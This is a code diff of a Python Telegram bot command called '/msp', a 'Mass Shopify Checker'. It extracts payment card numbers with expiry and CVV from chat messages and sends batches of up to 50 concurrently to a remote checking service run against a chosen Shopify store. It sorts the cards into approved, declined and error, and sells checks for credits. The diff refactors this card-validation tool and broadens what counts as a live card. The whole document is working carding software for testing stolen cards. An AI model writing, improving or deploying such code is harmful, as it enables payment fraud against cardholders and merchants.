@@ -3435,41 +3435,38 @@ import asyncio
 import time
 import httpx
 import re
-from telegram import Update
-from telegram.ext import CommandHandler, ContextTypes
 from html import escape
+from telegram import Update
+from telegram.ext import ContextTypes
 from db import get_user, update_user
 
 # Cooldown tracking
 last_msp_usage = {}
 
-# Regex for CC detection
+# Regex for card detection
 CARD_REGEX = re.compile(r"\b\d{12,19}\|\d{2}\|(?:\d{2}|\d{4})\|\d{3,4}\b")
 
-# Consume credit once
+# Consume credit
 async def consume_credit(user_id: int) -> bool:
     user_data = await get_user(user_id)
     if user_data and user_data.get("credits", 0) > 0:
-        new_credits = user_data["credits"] - 1
-        await update_user(user_id, credits=new_credits)
+        await update_user(user_id, credits=user_data["credits"] - 1)
         return True
     return False
 
-# Shopify check request
+# Shopify check
 async def check_card(session: httpx.AsyncClient, base_url: str, site: str, card: str):
     try:
         url = f"{base_url}?site={site}&cc={card}"
         r = await session.get(url, timeout=20)
         data = r.json()
-
         resp = data.get("Response", "Unknown")
         status = data.get("Status", "false")
         price = data.get("Price", "0")
-        gateway = data.get("Gateway", "N/A")
-
+        gateway = data.get("Gateway", "Self Shopify")
         return resp, status, price, gateway
     except Exception as e:
-        return f"Error: {e}", "false", "0", "N/A"
+        return f"Error: {e}", "false", "0", "Self Shopify"
 
 # /msp command
 async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -3481,45 +3478,35 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return await update.message.reply_text("⏳ Please wait 5 seconds before using /msp again.")
     last_msp_usage[user_id] = now
 
-    # Collect cards either from args or replied message
-    raw_input = None
-    if context.args:
-        raw_input = " ".join(context.args)
-    elif update.message.reply_to_message:
-        raw_input = update.message.reply_to_message.text
-
+    # Collect cards from args or replied message
+    raw_input = " ".join(context.args) if context.args else (update.message.reply_to_message.text if update.message.reply_to_message else None)
     if not raw_input:
         return await update.message.reply_text(
-            "Usage:\n<code>/msp card|mm|yy|cvv card2|mm|yy|cvv ...</code>\n"
-            "Or reply to a message containing cards.",
+            "Usage:\n<code>/msp card|mm|yy|cvv card2|mm|yy|cvv ...</code>\nOr reply to a message containing cards.",
             parse_mode="HTML"
         )
 
     cards = CARD_REGEX.findall(raw_input)
     if not cards:
         return await update.message.reply_text("❌ No valid cards found.")
-
     if len(cards) > 50:
         cards = cards[:50]
 
-    # DB fetch
+    # Fetch user data
     user_data = await get_user(user_id)
     if not user_data:
-        return await update.message.reply_text("❌ No user data found in DB.")
-
+        return await update.message.reply_text("❌ No user data found.")
     if not await consume_credit(user_id):
         return await update.message.reply_text("❌ You have no credits left.")
-
-    base_url = user_data.get("base_url", "https://auto-shopify-6cz4.onrender.com/index.php")
     site = user_data.get("custom_url")
     if not site:
         return await update.message.reply_text("❌ No custom_url set in your account.")
+    base_url = user_data.get("base_url", "https://auto-shopify-6cz4.onrender.com/index.php")
 
     msg = await update.message.reply_text("⚡ Processing Mass Shopify Check...")
 
     async def run_check():
-        approved, declined, errors = 0, 0, 0
-        checked = 0
+        approved = declined = errors = checked = 0
         site_price = None
         gateway_used = "Self Shopify"
         results = []
@@ -3530,37 +3517,31 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
             async def worker(card, first=False):
                 nonlocal approved, declined, errors, checked, site_price, gateway_used, results
-
                 async with sem:
                     resp, status, price, gateway = await check_card(session, base_url, site, card)
-
                     if first and site_price is None:
                         try:
                             site_price = float(price)
                         except:
                             site_price = 0.0
-
                     if gateway and gateway != "N/A":
                         gateway_used = gateway
 
                     resp_upper = resp.upper().strip()
 
                     # Classification
-                    if "R4 TOKEN EMPTY" in resp_upper:
+                    if "R4 TOKEN EMPTY" in resp_upper or "ERROR" in resp_upper:
                         errors += 1
                         line = f"⚠️ <code>{escape(card)}</code>\n   ↳ <i>{escape(resp)}</i>"
-                    elif resp_upper in ["INCORRECT_NUMBER", "FRAUD_SUSPECTED", "CARD_DECLINED"]:
+                    elif resp_upper in ["INCORRECT_NUMBER", "FRAUD_SUSPECTED", "CARD_DECLINED", "EXPIRE_CARD", "EXPIRED_CARD"]:
                         declined += 1
                         line = f"❌ <code>{escape(card)}</code>\n   ↳ <i>{escape(resp)}</i>"
-                    elif resp_upper in ["3D_AUTHENTICATION", "APPROVED", "SUCCESS"]:
+                    elif resp_upper in ["3D_AUTHENTICATION", "APPROVED", "SUCCESS", "INSUFFICIENT_FUNDS"]:
                         approved += 1
                         line = f"✅ <code>{escape(card)}</code>\n   ↳ <i>{escape(resp)}</i>"
-                    elif status.lower() == "true" and resp_upper not in ["CARD_DECLINED", "INCORRECT_NUMBER", "FRAUD_SUSPECTED"]:
+                    elif status.lower() == "true":
                         approved += 1
                         line = f"✅ <code>{escape(card)}</code>\n   ↳ <i>{escape(resp)}</i>"
-                    elif "ERROR" in resp_upper:
-                        errors += 1
-                        line = f"⚠️ <code>{escape(card)}</code>\n   ↳ <i>{escape(resp)}</i>"
                     else:
                         errors += 1
                         line = f"⚠️ <code>{escape(card)}</code>\n   ↳ <i>{escape(resp)}</i>"
@@ -3579,9 +3560,9 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         f"⚠️ 𝑬𝒓𝒓𝒐𝒓       : {errors}\n"
                         f"🔄 𝑪𝒉𝒆𝒄𝒌𝒆𝒅     : {checked} / {len(cards)}\n"
                         f"💲 𝑺𝒊𝒕𝒆 𝑷𝒓𝒊𝒄𝒆  : ${site_price if site_price else '0.00'}\n"
-                        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-                        f"#𝑨𝒖𝒕𝒐𝒔𝒉𝒐𝒑𝒊𝒇𝒚𝒄𝒉𝒆𝒄𝒌𝒔\n"
-                        f"────────────────\n"
+                        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+                        "#Results\n"
+                        "────────────────\n"
                         + "\n".join(results) +
                         "</code></pre>"
                     )
@@ -3590,9 +3571,9 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     except:
                         pass
 
-            # Run with first card fetching price
-            await asyncio.gather(*(worker(c, first=(i == 0)) for i, c in enumerate(cards)))
+            await asyncio.gather(*(worker(c, first=(i==0)) for i, c in enumerate(cards)))
 
+        # Final message
         final_text = (
             "<pre><code>"
             f"📊 𝐌𝐚𝐬𝐬 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐂𝐡𝐞𝐜𝐤𝐞𝐫\n"
@@ -3604,9 +3585,9 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
             f"🔄 𝑪𝒉𝒆𝒄𝒌𝒆𝒅     : {checked} / {len(cards)}\n"
             f"💲 𝑺𝒊𝒕𝒆 𝑷𝒓𝒊𝒄𝒆  : ${site_price if site_price else '0.00'}\n"
             f"🏬 𝑮𝒂𝒕𝒆𝒘𝒂𝒚     : {gateway_used}\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"#𝑨𝒖𝒕𝒐𝒔𝒉𝒐𝒑𝒊𝒇𝒚𝒄𝒉𝒆𝒄𝒌𝒔\n"
-            f"────────────────\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "#Results\n"
+            "────────────────\n"
             + "\n".join(results) +
             "</code></pre>"
         )
